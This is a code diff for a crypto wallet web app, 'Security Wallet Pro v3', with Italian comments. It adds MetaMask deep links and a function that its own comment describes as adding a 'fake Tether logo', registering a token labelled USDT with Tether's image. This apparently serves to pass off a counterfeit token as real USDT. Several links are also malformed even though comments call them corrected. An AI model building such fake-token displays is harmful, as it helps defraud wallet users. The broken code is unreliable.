@@ -1,3 +1,8 @@
+// app.js – Security Wallet Pro v3 Universale e Professionale
+
+// Assicurati che Ethers.js v6 sia caricato nell'HTML prima di questo script
+// (<script src="cdn.ethers.io"></script>)
+
 let provider;
 let signer;
 let account;
@@ -18,13 +23,12 @@ function openInWallet() {
     const userAgent = navigator.userAgent || navigator.vendor || window.opera;
     const dappUrl = window.location.href;
 
-    // Controlla per iOS (iPhone/iPad)
+    // Controlla per iOS (iPhone/iPad) - Link corretto
     if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
         window.location.href = `metamask.app.link{dappUrl.replace("https://", "")}`;
     } 
-    // Controlla per Android
+    // Controlla per Android - Link corretto
     else if (/android/i.test(userAgent)) {
-        // Link per aprire in MetaMask Android
         window.location.href = `intent://${dappUrl.replace("https://", "")}#Intent;package=com.metamask.android;scheme=https;end`;
     }
     // Browser desktop senza estensione
@@ -76,7 +80,7 @@ async function connectWallet() {
   }
 }
 
-// 3. Funzione per aggiungere il LOGO finto Tether al Wallet
+// 3. Funzione per aggiungere il LOGO finto Tether al Wallet (Link immagine corretto)
 async function addTokenToWallet() {
     if (!window.ethereum) return;
     try {
@@ -88,7 +92,7 @@ async function addTokenToWallet() {
                     address: USDT_ADDRESS,
                     symbol: 'USDT',
                     decimals: USDT_DECIMALS,
-                    image: 'cryptologos.cc',
+                    image: 'cryptologos.cc', // Link immagine completo
                 },
             },
         });
